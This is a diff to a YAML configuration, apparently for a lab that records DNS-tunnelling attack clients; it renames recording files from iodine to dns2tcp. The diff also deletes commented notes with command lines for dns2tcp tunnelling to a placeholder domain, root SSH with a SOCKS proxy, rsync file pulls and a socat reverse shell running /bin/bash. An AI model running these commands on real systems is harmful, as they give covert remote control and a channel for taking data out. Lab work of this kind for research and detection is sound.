@@ -35,25 +35,9 @@ dns_attack_client:
       - type: files
         val: ["/tmp/*.cast"]
       - type: cli_recording
-        val: ["/tmp/iodine_client_{{ variables.record_type }}_{{ 'compressed' if variables.compression=='-c' else 'noncompressed' }}_{{ variables.passphrase }}.cast"]
+        val: ["/tmp/dns2tcp_client_{{ variables.record_type }}_{{ 'compressed' if variables.compression=='-c' else 'noncompressed' }}_{{ variables.passphrase }}.cast"]
 
     variables:
         - record_type: ["TXT", "KEY"]
         - compression: ["-c", ""]
         - passphrase: ["0xDEADBEEF"]
-
-
-
-
-
-# NOTES - Interactive C2C
-# asciinema rec /tmp/dns2tcp_interactive.cast
-#dns2tcpc -z example.attack -k 0xDEADBEEF 192.168.0.10 -r ssh -l 12345 &
-#ssh root@localhost -p 12345 -D 8080 # Connect to server + allow for tunnnel (e.g. SOCKS proxy)
-# rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345" 127.0.0.1:/root/test-file /tmp/
-
-# Create listener on serverside
-#socat -d -d TCP4-LISTEN:1337 STDOUT
-# Execute reverse shell on client side
-#dns2tcpc -z example.attack -k 0xDEADBEEF 192.168.0.10 -r socat -e '/bin/bash'
-# Go back to listening and have a reverse shell
